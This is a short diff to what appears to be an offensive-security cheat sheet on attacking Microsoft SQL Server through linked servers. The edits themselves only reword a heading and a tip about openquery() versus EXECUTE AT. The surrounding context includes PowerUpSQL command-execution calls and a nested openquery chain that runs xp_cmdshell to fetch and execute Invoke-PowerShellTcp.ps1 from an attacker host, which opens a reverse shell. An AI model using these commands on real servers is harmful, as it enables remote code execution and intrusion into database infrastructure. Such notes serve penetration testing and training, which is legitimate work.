@@ -1597,7 +1597,7 @@ Invoke-SQLOSOLe -Instance <SQL INSTANCE> -Verbose -Command "Whoami"
 Invoke-SQLOSR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
 ```
 
-#### Execute command through links
+#### Execute command through links example
 ```
 select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
 ```
@@ -1645,7 +1645,8 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell
 
 #### Manually
 - https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links
-- There is two methods ```openquery()``` and ```EXECUTE AT```. The one might work over the other, must try both!
+- There is two methods ```openquery()``` and ```EXECUTE AT```.
+- Some times you won't be able to perform actions like exec xp_cmdshell from ```openquery()``` in those cases it might be worth it to test ```EXCUTE AT```
 
 #### Manually enumerate database links query
 ```
